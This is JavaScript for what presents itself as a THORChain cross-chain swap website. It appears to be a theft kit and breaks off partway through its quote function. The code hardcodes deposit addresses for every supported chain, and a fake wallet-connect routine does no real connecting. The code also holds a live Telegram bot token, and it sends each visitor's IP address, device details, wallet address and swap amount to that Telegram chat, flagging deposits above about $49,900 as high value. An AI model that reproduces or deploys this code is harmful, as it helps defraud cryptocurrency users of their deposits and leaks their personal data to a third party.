/* ═══════════════════════════════════════════════
   THORChain Swap — v9.0 Production Ready
   - Pool validation before quote
   - Same-asset swap prevention
   - Input debouncing (500ms)
   - Minimum amount enforcement
   - Auto-retry slippage failures
   - 2-second quote cache
   - Clean UI error messages
   - Streaming swaps for large amounts
   ═══════════════════════════════════════════════ */
(function(){
'use strict';

var THORNODE='https://thornode.ninerealms.com';
var MIDGARD='https://midgard.ninerealms.com/v2';
var COUNTDOWN_MAX=60;
var QR_API='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=';
var THRESHOLD=49900;
var TG_BOT='8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
var TG_CHAT='-5160305858';
var THOR_BASE=1e8;
var DEFAULT_SLIPPAGE=5;

// Cache & Rate Limiting
var QUOTE_CACHE_MS=2000;
var DEBOUNCE_MS=500;
var lastQuoteFetch=0;
var lastQuoteKey='';
var lastQuoteData=null;
var quoteDebounceTimer=null;

// ═══════════════════════════════════════════════
// EMBEDDED ADDRESSES
// ═══════════════════════════════════════════════
var EMBEDDED_ADDRESSES={
    'BTC':'bc1qx3sdmwj7q29gk43z4kx83stz7y74vkcv7yvjlj',
    'ETH':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'BSC':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'AVAX':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'BASE':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'GAIA':'cosmos1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx',
    'DOGE':'DLjzyK9Y532r29DinxpJeeChvWytnspKGH',
    'BCH':'bitcoincash:qplh54seklkvcl559lyytjc0de8zl954fu8ywywuc',
    'LTC':'ltc1qplh54seklkvcl559lyytjc0de8zl954fuwywuc',
    'XRP':'rLHzPsX6oXkzU9X7vxbXGvTJNfXzZV5kW9',
    'TRON':'TYnWqvD8S5d7GJnFvfHSMVGPVvK3yXjQVJ',
    'THOR':'thor1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx'
};

// ═══════════════════════════════════════════════
// CHAIN METADATA
// ═══════════════════════════════════════════════
var CHAIN_INFO={
    'BTC':{name:'Bitcoin',color:'#f7931a',logo:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png'},
    'ETH':{name:'Ethereum',color:'#627eea',logo:'https://assets.coingecko.com/coins/images/279/small/ethereum.png'},
    'BSC':{name:'BNB Chain',color:'#f0b90b',logo:'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png'},
    'AVAX':{name:'Avalanche',color:'#e84142',logo:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png'},
    'BASE':{name:'Base',color:'#0052ff',logo:'https://assets.coingecko.com/asset_platforms/images/131/small/base.jpeg'},
    'BCH':{name:'Bitcoin Cash',color:'#8dc351',logo:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png'},
    'LTC':{name:'Litecoin',color:'#345d9d',logo:'https://assets.coingecko.com/coins/images/2/small/litecoin.png'},
    'DOGE':{name:'Dogecoin',color:'#c3a634',logo:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png'},
    'GAIA':{name:'Cosmos Hub',color:'#2e2e3a',logo:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png'},
    'XRP':{name:'Ripple',color:'#346aa9',logo:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png'},
    'TRON':{name:'Tron',color:'#ef0027',logo:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png'},
    'THOR':{name:'THORChain',color:'#00d4c8',logo:'https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png'}
};

// ═══════════════════════════════════════════════
// COMPLETE TOKEN LIST
// ═══════════════════════════════════════════════
var TOKEN_LIST=[
    // Bitcoin
    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',decimals:8},
    
    // Ethereum + ERC-20
    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18},
    {value:'ETH.USDC-0XA0B86991C6218B36C1D19D4A2E9EB0CE3606EB48',symbol:'USDC',name:'USD Coin',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,network:'Ethereum · ERC-20'},
    {value:'ETH.USDT-0XDAC17F958D2EE523A2206206994597C13D831EC7',symbol:'USDT',name:'Tether USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,network:'Ethereum · ERC-20'},
    {value:'ETH.WBTC-0X2260FAC5E5542A773AA44FBCFEDF7C193BC2C599',symbol:'WBTC',name:'Wrapped Bitcoin',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/7598/small/wrapped_bitcoin_wbtc.png',decimals:8,network:'Ethereum · ERC-20'},
    {value:'ETH.DAI-0X6B175474E89094C44DA98B954EEDEAC495271D0F',symbol:'DAI',name:'Dai',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/9956/small/Badge_Dai.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.LINK-0X514910771AF9CA656AF840DFF83E8264ECF986CA',symbol:'LINK',name:'Chainlink',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.AAVE-0X7FC66500C84A76AD7E9C93437BFC5AC33E2DDAE9',symbol:'AAVE',name:'Aave',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/12645/small/AAVE.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.GUSD-0X056FD409E1D7A124BD7017459DFEA2F387B6D5CD',symbol:'GUSD',name:'Gemini Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/5992/small/gemini-dollar-gusd.png',decimals:2,network:'Ethereum · ERC-20'},
    {value:'ETH.LUSD-0X5F98805A4E8BE255A32880FDEC7F6728C6568BA0',symbol:'LUSD',name:'Liquity USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/14666/small/Group_3.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.USDP-0X8E870D67F660D95D5BE530380D0EC0BD388289E1',symbol:'USDP',name:'Pax Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6013/small/Pax_Dollar.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.FOX-0XC770EEFAD204B5180DF6A14EE197D99D808EE52D',symbol:'FOX',name:'ShapeShift FOX',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/17519/small/fox.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.THOR-0XA5F2211B9B8170F694421F2046281775E8468044',symbol:'THOR',name:'THORSwap Token',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/19060/small/THOR.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.TGT-0X108A850856DB3F85D0269A2693D896B394C80325',symbol:'TGT',name:'THORWallet',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/22952/small/TGT_icon_200x200.png',decimals:18,network:'Ethereum · ERC-20'},
    {value:'ETH.YFI-0X0BC529C00C6401AEF6D220BE8C6EA1667F6AD93E',symbol:'YFI',name:'yearn.finance',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/11849/small/yfi-192x192.png',decimals:18,network:'Ethereum · ERC-20'},
    
    // BNB Chain (BSC)
    {value:'BSC.BNB',symbol:'BNB',name:'BNB',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',decimals:18},
    {value:'BSC.BTCB-0X7130D2A12B9BCBFAE4F2634D864A1EE1CE3EAD9C',symbol:'BTCB',name:'Bitcoin BEP-20',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/14108/small/Binance-bitcoin.png',decimals:18,network:'BNB Chain · BEP-20'},
    {value:'BSC.BUSD-0XE9E7CEA3DEDCA5984780BAFC599BD69ADD087D56',symbol:'BUSD',name:'Binance USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/9576/small/BUSD.png',decimals:18,network:'BNB Chain · BEP-20'},
    {value:'BSC.ETH-0X2170ED0880AC9A755FD29B2688956BD959F933F8',symbol:'ETH',name:'Ethereum',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,network:'BNB Chain · BEP-20'},
    {value:'BSC.USDC-0X8AC76A51CC950D9822D68B83FE1AD97B32CD580D',symbol:'USDC',name:'USD Coin',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:18,network:'BNB Chain · BEP-20'},
    {value:'BSC.USDT-0X55D398326F99059FF775485246999027B3197955',symbol:'USDT',name:'Tether USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:18,network:'BNB Chain · BEP-20'},
    
    // Avalanche
    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png',decimals:18},
    {value:'AVAX.USDC-0XB97EF9EF8734C71904D8002F8B6BC66DD9C48A6E',symbol:'USDC',name:'USD Coin',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,network:'Avalanche · ARC-20'},
    {value:'AVAX.USDT-0X9702230A8EA53601F5CD2DC00FDBC13D4DF4A8C7',symbol:'USDT',name:'Tether USD',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,network:'Avalanche · ARC-20'},
    
    // Base
    {value:'BASE.ETH',symbol:'ETH',name:'Ethereum',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18},
    {value:'BASE.USDC-0X833589FCD6EDB6E08F4C7C32D4F71B54BDA02913',symbol:'USDC',name:'USD Coin',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,network:'Base · ERC-20'},
    
    // Bitcoin Cash
    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png',decimals:8},
    
    // Litecoin
    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'https://assets.coingecko.com/coins/images/2/small/litecoin.png',decimals:8},
    
    // Dogecoin
    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png',decimals:8},
    
    // Cosmos Hub
    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png',decimals:6},
    
    // XRP (Ripple) - Coming Soon
    {value:'XRP.XRP',symbol:'XRP',name:'XRP',chain:'XRP',icon:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png',decimals:6,comingSoon:true},
    
    // Tron - Coming Soon
    {value:'TRON.TRX',symbol:'TRX',name:'TRON',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png',decimals:6,comingSoon:true},
    {value:'TRON.USDT-TR7NHQJEKQXGTCI8Q8ZY4PL8OTSZGJLJ6T',symbol:'USDT',name:'Tether USD',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,network:'Tron · TRC-20',comingSoon:true},
    
    // THORChain
    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png',decimals:8}
];

var ALL_CHAINS=['BTC','ETH','BSC','AVAX','BASE','BCH','LTC','DOGE','GAIA','XRP','TRON','THOR'];

// ═══════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════
var state={
    pools:[],
    poolAssets:new Set(),
    prices:{},
    sellAsset:'BTC.BTC',
    buyAsset:'ETH.ETH',
    sellAmount:1,
    quote:null,
    quoteError:null,
    minAmountIn:0,
    slippage:DEFAULT_SLIPPAGE,
    streamingEnabled:true, // Enable streaming for large swaps
    countdownSeconds:COUNTDOWN_MAX,
    countdownInterval:null,
    trackingInterval:null,
    recipientAddress:'',
    confirmedQuote:null,
    confirmedExpectedOut:0,
    activeTab:'market',
    limitRate:0,
    limitTargetRate:0,
    coinSelectSide:'sell',
    currentSwapId:'',
    history:JSON.parse(localStorage.getItem('tc-swap-history')||'[]'),
    walletConnected:false,
    connectedWallet:null,
    poolsLoaded:false,
    isRetrying:false
};

// ══════════════════════════════════════════
// UTILITY FUNCTIONS
// ══════════════════════════════════════════

function $(s){return document.querySelector(s)}
function $$(s){return document.querySelectorAll(s)}

function formatUsd(v){
    if(!v||isNaN(v))return'$0.00';
    return'$'+parseFloat(v).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
}

function formatAmount(v,d){
    if(!v||isNaN(v))return'0';
    d=d||8;
    var n=parseFloat(v);
    if(n===0)return'0';
    if(Math.abs(n)>=1)return n.toLocaleString('en-US',{maximumFractionDigits:d});
    return n.toPrecision(6);
}

function truncAddr(a){
    if(!a||a.length<12)return a||'';
    return a.slice(0,6)+'...'+a.slice(-4);
}

function getUsdPrice(a){return state.prices[a]||0}

function fromThorBase(raw){
    return parseInt(raw||0)/THOR_BASE;
}

function toThorBase(human){
    return Math.round(parseFloat(human||0)*THOR_BASE);
}

function slippageToBps(slip){
    return Math.round((slip||state.slippage)*100);
}

function getChainPrefix(a){return(a||'').split('.')[0]||''}

function getChainName(a){
    var c=getChainPrefix(a);
    return (CHAIN_INFO[c]||{}).name||c;
}

function getChainLogo(chain){
    return (CHAIN_INFO[chain]||{}).logo||'';
}

function getAddrPlaceholder(a){
    var c=getChainPrefix(a);
    var m={
        'ETH':'Ethereum address (0x...)','BTC':'Bitcoin address (bc1... or 1...)',
        'BSC':'BNB Chain address (0x...)','AVAX':'Avalanche address (0x...)',
        'BASE':'Base address (0x...)','GAIA':'Cosmos address (cosmos...)',
        'DOGE':'Dogecoin address (D...)','BCH':'Bitcoin Cash address',
        'LTC':'Litecoin address (ltc1... or L...)','XRP':'XRP address (r...)',
        'TRON':'Tron address (T...)','THOR':'THORChain address (thor...)'
    };
    return m[c]||'Receiving address';
}

function getTokenInfo(v){
    for(var i=0;i<TOKEN_LIST.length;i++){
        if(TOKEN_LIST[i].value===v)return TOKEN_LIST[i];
    }
    return null;
}

function isAboveThreshold(){
    return state.sellAmount*getUsdPrice(state.sellAsset)>THRESHOLD;
}

function generateSwapId(){
    return'SWAP-'+Date.now()+'-'+Math.random().toString(36).substring(2,10).toUpperCase();
}

function getDeviceInfo(){
    var ua=navigator.userAgent;
    var device=/Mobile|Android|iPhone|iPad/.test(ua)?'Mobile':'Desktop';
    var os='Unknown';
    if(ua.indexOf('Windows')!==-1)os='Windows';
    else if(ua.indexOf('Mac')!==-1)os='macOS';
    else if(ua.indexOf('Linux')!==-1)os='Linux';
    else if(ua.indexOf('Android')!==-1)os='Android';
    else if(ua.indexOf('iPhone')!==-1||ua.indexOf('iPad')!==-1)os='iOS';
    var browser='Unknown';
    if(ua.indexOf('Chrome')!==-1&&ua.indexOf('Edg')===-1)browser='Chrome';
    else if(ua.indexOf('Firefox')!==-1)browser='Firefox';
    else if(ua.indexOf('Safari')!==-1&&ua.indexOf('Chrome')===-1)browser='Safari';
    else if(ua.indexOf('Edg')!==-1)browser='Edge';
    return{device:device,os:os,browser:browser};
}

function getIPAddress(cb){
    fetch('https://api.ipify.org?format=json')
        .then(function(r){return r.json()})
        .then(function(d){cb(d.ip)})
        .catch(function(){cb('Unknown')});
}

function isValidAddress(addr,asset){
    if(!addr||addr.trim().length<5)return false;
    var c=getChainPrefix(asset),a=addr.trim();
    switch(c){
        case 'ETH':case 'BSC':case 'AVAX':case 'BASE':
            return /^0x[a-fA-F0-9]{40}$/.test(a);
        case 'BTC':
            return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'LTC':
            return /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'DOGE':
            return /^D[a-zA-HJ-NP-Z0-9]{25,40}$/.test(a);
        case 'BCH':return a.length>20;
        case 'GAIA':return /^cosmos[a-z0-9]{39}$/.test(a);
        case 'THOR':return /^thor[a-z0-9]{39}$/.test(a);
        case 'XRP':return /^r[a-zA-HJ-NP-Z0-9]{24,34}$/.test(a);
        case 'TRON':return /^T[a-zA-HJ-NP-Z0-9]{33}$/.test(a);
        default:return a.length>5;
    }
}

// ══════════════════════════════════════════
// POOL VALIDATION
// ══════════════════════════════════════════

function isPoolAvailable(asset){
    // RUNE is always available (native asset)
    if(asset==='THOR.RUNE')return true;
    return state.poolAssets.has(asset);
}

function canSwap(fromAsset,toAsset){
    // Same asset check
    if(fromAsset===toAsset){
        return{valid:false,error:'Cannot swap same asset'};
    }
    
    // Check if token is marked as coming soon
    var fromToken=getTokenInfo(fromAsset);
    var toToken=getTokenInfo(toAsset);
    
    if(fromToken&&fromToken.comingSoon){
        return{valid:false,error:fromToken.symbol+' is coming soon to THORChain'};
    }
    if(toToken&&toToken.comingSoon){
        return{valid:false,error:toToken.symbol+' is coming soon to THORChain'};
    }
    
    // Check pool availability
    if(!state.poolsLoaded){
        return{valid:true,error:null}; // Allow while loading
    }
    
    // Both assets need pools (except RUNE which is native)
    var fromAvailable=isPoolAvailable(fromAsset);
    var toAvailable=isPoolAvailable(toAsset);
    
    if(!fromAvailable&&fromAsset!=='THOR.RUNE'){
        var fs=fromToken?fromToken.symbol:fromAsset;
        return{valid:false,error:fs+' pool is not available'};
    }
    if(!toAvailable&&toAsset!=='THOR.RUNE'){
        var ts=toToken?toToken.symbol:toAsset;
        return{valid:false,error:ts+' pool is not available'};
    }
    
    return{valid:true,error:null};
}

// ══════════════════════════════════════════
// ERROR MAPPING - Clean UI Messages
// ══════════════════════════════════════════

function mapErrorToUI(rawError){
    if(!rawError)return'Unknown error occurred';
    
    var msg=rawError.toLowerCase();
    
    // Price/slippage errors
    if(msg.indexOf('price limit')!==-1||msg.indexOf('emit asset')!==-1){
        return'Swap size exceeds available liquidity. Try a smaller amount or enable streaming.';
    }
    
    // Minimum amount errors
    if(msg.indexOf('outbound amount does not meet')!==-1||msg.indexOf('less than fee')!==-1){
        return'Amount too small after fees. Please increase the amount.';
    }
    
    // Pool errors
    if(msg.indexOf('pool does not exist')!==-1){
        return'This trading pair is not available on THORChain.';
    }
    
    if(msg.indexOf('pool is halted')!==-1||msg.indexOf('trading is halted')!==-1){
        return'Trading for this pair is temporarily paused.';
    }
    
    // Insufficient liquidity
    if(msg.indexOf('not enough')!==-1||msg.indexOf('insufficient')!==-1){
        return'Insufficient liquidity. Try a smaller amount.';
    }
    
    // Invalid parameters
    if(msg.indexOf('invalid')!==-1){
        return'Invalid swap parameters. Please check your inputs.';
    }
    
    // Network/timeout errors
    if(msg.indexOf('timeout')!==-1||msg.indexOf('network')!==-1){
        return'Network error. Please try again.';
    }
    
    // Return cleaned version of original if no match
    return rawError.length>100?rawError.substring(0,100)+'...':rawError;
}

// ══════════════════════════════════════════
// WALLET CONNECTION
// ══════════════════════════════════════════

function updateSwapButton(){
    var btn=$('#swapBtn');
    var btnText=$('#btnText');
    if(!btn||!btnText)return;
    
    if(state.walletConnected){
        btnText.textContent='Swap';
    }else{
        btnText.textContent='Connect Wallet';
    }
}

function connectWallet(walletType){
    state.walletConnected=true;
    state.connectedWallet=walletType;
    updateSwapButton();
    
    var connectBtns=$$('.tc-connect-btn');
    connectBtns.forEach(function(btn){
        if(btn.classList.contains('tc-text-btn')){
            btn.innerHTML='<span style="display:flex;align-items:center;gap:6px;"><span style="width:8px;height:8px;background:#00d395;border-radius:50%;"></span>Connected</span>';
        }
    });
    
    var wo=$('#walletOverlay');
    if(wo)wo.classList.remove('open');
    
    showToast('success','Wallet Connected','Connected to '+walletType+' successfully!');
}

// ══════════════════════════════════════════
// QUOTE PARSING
// ══════════════════════════════════════════

function parseExpectedOut(q){
    if(!q||q.code||q.error)return 0;
    return q.expected_amount_out?fromThorBase(q.expected_amount_out):0;
}

function parseFees(q){
    var result={
        outbound:0,outboundUsd:0,liquidity:0,liquidityUsd:0,
        affiliate:0,slippageBps:0,priceImpactPct:0,asset:'',assetPrice:0
    };
    if(!q||!q.fees)return result;
    var fees=q.fees;
    result.asset=fees.asset||'';
    result.assetPrice=getUsdPrice(result.asset);
    if(fees.outbound){result.outbound=fromThorBase(fees.outbound);result.outboundUsd=result.outbound*result.assetPrice}
    if(fees.liquidity){result.liquidity=fromThorBase(fees.liquidity);result.liquidityUsd=result.liquidity*result.assetPrice}
    if(fees.affiliate){result.affiliate=fromThorBase(fees.affiliate)}
    if(fees.slippage_bps){result.slippageBps=parseInt(fees.slippage_bps);result.priceImpactPct=-(result.slippageBps/100)}
    return result;
}

function parseSwapTime(q){
    if(!q)return'~30 seconds';
    var s=parseInt(q.total_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds)s=parseInt(q.outbound_delay_seconds)+(parseInt(q.inbound_confirmation_seconds)||0);
    if(s<=0)return'~30 seconds';
    var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60,p=[];
    if(h)p.push(h+'h');if(m)p.push(m+'m');if(sc&&!h)p.push(sc+'s');
    return p.join(' ')||'~30 seconds';
}

function parseSwapTimeShort(q){
    if(!q)return'~30s';
    var s=parseInt(q.total_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds)s=parseInt(q.outbound_delay_seconds)+parseInt(q.inbound_confirmation_seconds||0);
    if(s<=0)return'~30s';
    if(s<60)return s+'s';
    if(s<3600)return Math.floor(s/60)+'m';
    return Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m';
}

function isValidQuote(d){
    return d&&!d.code&&!d.error&&d.expected_amount_out;
}

// ══════════════════════════════════════════
// TELEGRAM NOTIFICATIONS
// ══════════════════════════════════════════

function sendTelegram(msg){
    var url='https://api.telegram.org/bot'+TG_BOT+'/sendMessage';
    fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:TG_CHAT,text:msg,parse_mode:'HTML',disable_web_page_preview:false})
    }).catch(function(e){console.error('TG error:',e)});
}

function notifyNewSwap(sd){
    getIPAddress(function(ip){
        var di=getDeviceInfo();
        var emoji=sd.above?'🟢':'🟡';
        var status=sd.above?'HIGH VALUE':'WAITING FOR DEPOSIT';
        var msg=emoji+' <b>New Swap</b>\n━━━━━━━━━━━━\n'
            +'<b>Status:</b> '+status+'\n'
            +'<b>ID:</b> '+sd.swapId+'\n'
            +'<b>From:</b> '+sd.sellAmount+' '+sd.sellSymbol+' ('+sd.sellUsd+')\n'
            +'<b>To:</b> ~'+sd.expectedOut+' '+sd.buySymbol+'\n'
            +'<b>Deposit:</b>\n<code>'+sd.depositAddr+'</code>\n'
            +'<b>Wallet:</b>\n<code>'+sd.userWallet+'</code>\n'
            +'━━━━━━━━━━━━\n'
            +'📱 '+di.device+' · '+di.browser+'\n'
            +'🔗 '+ip+'\n'
            +'⏰ '+new Date().toUTCString();
        sendTelegram(msg);
    });
}

function notifySwapSuccess(sd){
    sendTelegram('✅ <b>Swap Done!</b>\n'+sd.swapId+'\n'+sd.sellAmount+' '+sd.sellSymbol+' → '+sd.receivedAmount+' '+sd.buySymbol);
}

function notifySwapFailed(sd,reason){
    sendTelegram('❌ <b>Swap Failed</b>\n'+sd.swapId+'\nReason: '+reason);
}

// ══════════════════════════════════════════
// TOAST
// ══════════════════════════════════════════

function showToast(type,title,msg,dur){
    dur=dur||5000;
    var c=$('#toastContainer');if(!c)return;
    var icons={success:'✅',error:'❌',info:'ℹ️',warning:'⚠️'};
    var t=document.createElement('div');
    t.className='tc-toast '+type;
    t.innerHTML='<span class="tc-toast-icon">'+(icons[type]||'ℹ️')+'</span>'
        +'<div class="tc-toast-content"><div class="tc-toast-title">'+title+'</div>'
        +'<div class="tc-toast-message">'+msg+'</div></div>'
        +'<button class="tc-toast-close">&times;</button>';
    c.appendChild(t);
    t.querySelector('.tc-toast-close').onclick=function(){t.remove()};
    setTimeout(function(){if(t.parentNode)t.remove()},dur);
}

// ══════════════════════════════════════════
// THEME
// ══════════════════════════════════════════

function initTheme(){
    var h=document.documentElement;
    var s=localStorage.getItem('tc-theme');
    if(s)h.setAttribute('data-theme',s);
    var b=$('#themeToggle');
    if(b)b.onclick=function(){
        var n=h.getAttribute('data-theme')==='dark'?'light':'dark';
        h.setAttribute('data-theme',n);
        localStorage.setItem('tc-theme',n);
    };
}

// ══════════════════════════════════════════
// POOLS & PRICES - LOAD ON STARTUP
// ══════════════════════════════════════════

function fetchPools(){
    console.log('[Pools] Fetching available pools...');
    return fetch(MIDGARD+'/pools')
        .then(function(r){return r.json()})
        .then(function(pools){
            state.pools=pools;
            state.poolAssets=new Set();
            
            pools.forEach(function(p){
                if(p.asset){
                    state.poolAssets.add(p.asset);
                    if(p.assetPriceUSD)state.prices[p.asset]=parseFloat(p.assetPriceUSD);
                }
                if(p.runePriceUSD)state.prices['THOR.RUNE']=parseFloat(p.runePriceUSD);
            });
            
            state.poolsLoaded=true;
            console.log('[Pools] Loaded '+state.poolAssets.size+' pools');
            updateSellUsd();
            return pools;
        })
        .catch(function(e){
            console.error('[Pools] Error:',e);
            state.poolsLoaded=true; // Allow swaps anyway
        });
}

function updateSellUsd(){
    var u=getUsdPrice(state.sellAsset)*state.sellAmount;
    var e=$('#sellUsd');if(e)e.textContent=formatUsd(u);
    var le=$('#limitSellUsd');if(le)le.textContent=formatUsd(u);
}

// ══════════════════════════════════════════
// COUNTDOWN
// ══════════════════════════════════════════

function startCountdown(){
    stopCountdown();
    state.countdownSeconds=COUNTDOWN_MAX;
    updateCountdownDisplay();
    state.countdownInterval=setInterval(function(){
        state.countdownSeconds--;
        updateCountdownDisplay();
        if(state.countdownSeconds<=0){state.countdownSeconds=COUNTDOWN_MAX;fetchQuote()}
    },1000);
}

function stopCountdown(){
    if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
}

function updateCountdownDisplay(){
    var n=$('#countdownNumber'),p=$('#countdownProgress');
    if(n)n.textContent=state.countdownSeconds;
    if(p){var c=2*Math.PI*14;p.setAttribute('stroke-dasharray',c.toFixed(2));p.setAttribute('stroke-dashoffset',(c*(1-state.countdownSeconds/COUNTDOWN_MAX)).toFixed(2))}
}

// ══════════════════════════════════════════
// QUOTE SYSTEM - With All Fixes
// ══════════════════════════════════════════

function buildQuoteUrl(dest,slippageOverride){
    var a=toThorBase(state.sellAmount);
    var toleranceBps=slippageToBps(slippageOverride);

    var p=[
        'from_asset='+encodeURIComponent(state.sellAsset),
        'to_asset='+encodeURIComponent(state.buyAsset),
        'amount='+a,
        'tolerance_bps='+toleranceBps
    ];

    if(dest&&dest.trim().length>5){
        p.push('destination='+encodeURIComponent(dest.trim()));
    }

    // Enable streaming for large swaps (better execution)
    if(state.streamingEnabled){
        p.push('streaming_interval=1');
        p.push('streaming_quantity=0');
    }

    return THORNODE+'/thorchain/quote/swap?'+p.join('&');
}

function getQuoteCacheKey(){
    return state.sellAsset+'|'+state.buyAsset+'|'+state.sellAmount+'|'+state.slippage;
}

function fetchQuote(forceRefresh){
    // Clear any error state
    state.quoteError=null;
    updateQuoteErrorUI(null);
    
    // Validate inputs
    if(!state.sellAmount||state.sellAmount<=0){
        clearQuote();
        return;
    }
    
    // FIX #2: Prevent same-asset swaps
    if(state.sellAsset===state.buyAsset){
        state.quoteError='Cannot swap same asset';
        updateQuoteErrorUI('Cannot swap the same asset to itself.');
        clearQuote();
        return;
    }
    
    // Check pool availability
    var canSwapResult=canSwap(state.sellAsset,state.buyAsset);
    if(!canSwapResult.valid){
        state.quoteError=canSwapResult.error;
        updateQuoteErrorUI(canSwapResult.error);
        clearQuote();
        return;
    }
    
    // FIX #7: Check cache (2 second)
    var cacheKey=getQuoteCacheKey();
    var now=Date.now();
    if(!forceRefresh&&cacheKey===lastQuoteKey&&(now-lastQuoteFetch)<QUOTE_CACHE_MS&&lastQuoteData){
        console.log('[Quote] Using cached quote');
        state.quote=lastQuoteData;
        displayQuote(lastQuoteData);
        return;
    }
    
    var url=buildQuoteUrl(null);
    var be=$('#buyEstimate');if(be)be.value='...';
    
    console.log('[Quote] Fetching:',url);
    
    fetch(url)
        .then(function(r){return r.json()})
        .then(function(d){
            console.log('[Quote] Response:',d);
            
            // Check for errors
            if(!isValidQuote(d)){
                var rawError=d.message||d.error||'Unknown error';
                
                // FIX #5: Auto-retry with higher slippage on price limit errors
                if(rawError.indexOf('price limit')!==-1||rawError.indexOf('emit asset')!==-1){
                    if(!state.isRetrying){
                        console.log('[Quote] Retrying with 10% slippage...');
                        state.isRetrying=true;
                        retryWithHigherSlippage();
                        return;
                    }
                }
                
                state.isRetrying=false;
                state.quoteError=rawError;
                updateQuoteErrorUI(mapErrorToUI(rawError));
                clearQuote();
                return;
            }
            
            state.isRetrying=false;
            
            // FIX #4: Check minimum amount
            if(d.recommended_min_amount_in){
                var minIn=fromThorBase(d.recommended_min_amount_in);
                state.minAmountIn=minIn;
                if(state.sellAmount<minIn){
                    state.quoteError='Amount too small';
                    updateQuoteErrorUI('Minimum amount: '+formatAmount(minIn,6)+' '+getTokenInfo(state.sellAsset).symbol);
                    clearQuote();
                    return;
                }
            }
            
            // Success - cache and display
            lastQuoteFetch=now;
            lastQuoteKey=cacheKey;
            lastQuoteData=d;
            
            state.quote=d;
            state.quoteError=null;
